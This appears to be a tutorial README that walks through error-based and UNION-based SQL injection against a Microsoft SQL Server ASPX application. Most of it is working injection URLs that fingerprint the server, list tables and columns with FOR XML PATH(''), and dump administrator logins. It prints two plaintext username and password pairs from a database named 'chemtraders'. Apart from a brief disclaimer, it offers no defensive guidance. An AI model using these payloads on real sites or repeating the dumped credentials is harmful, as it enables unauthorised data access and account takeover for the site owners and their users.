# MSSQL-Injection

Now let's get started the ERROR BASED INJECTION on MSSQL server, MSSQL it's Microsoft SQL Server in this post i will use error based injection with malicious interogation for manipulation database and extract administrator credentials. I will use a vulnerable aspx app in localhost for this example. I do not support these illegal activities !
```sql
 http://localhost/Product.aspx?Id=13 and 1=db_name()--
```

Using this simple query we will see the name of the database.

Now the database name is "chemtraders" 
Next step i want to see the DB and OS version for this i will use this query:

```sql
http://localhost/Product.aspx?Id=13 and @@version=1--
```

and output is:

We see "Microsoft SQL Server 2012 ( SP1 )"

Now let's get extract Tables name and Columns from DB with one query:
```sql
http://localhost/Product.aspx?Id=13 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--
```
and output is:

Ok now are interested:

AdminLogin ( Table )
UserName ( Column )
Password ( Column )

Let's get dump from this Columns ( UserName and Password ):
```sql
http://localhost/Product.aspx?Id=13 and 1=(select+Password,username+from+AdminLogin FOR XML PATH(''))--
```
Output is:

```plaintext
Username: admcheter
Password: bweb@chem#123$tre ( this is plaintext )
```

This query it's in Error Based but it is possible and with Union Select

Let's see how we do this

```sql
http://localhost/Category-Product.aspx?id=-6' union select 1,(select table_name%2b'::'%2bcolumn_name as t from information_schema.columns FOR XML PATH('')),3-- -
```

![Screenshot from 2024-01-25 11-11-32](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/41178b9a-951e-4bee-b8e4-dace0a350e9b)

Now we see UserInfo, username and Password.

For this situation i want to extract Administration credential form this columns
```sql
http://localhost/Category-Product.aspx?id=-6' union select 1,(select User_Name,Password from UserInfo FOR XML PATH('')),3-- -
```

```plaintext
Username: Admin
Password: simplifi@123 ( plaintext )
```
In this query, the FOR XML PATH('') clause is used to concatenate the query results into XML format and to obtain a scalar result.
In practice, this allows the obtained data to be retrieved as a single string, easily manipulable and usable within the SQL injection. The use of FOR XML PATH('') is not necessary in all SQL injection queries, but it can be used to format the results in a way that allows for efficient exploitation of the vulnerability.

We are done tested my MSSQL Server.
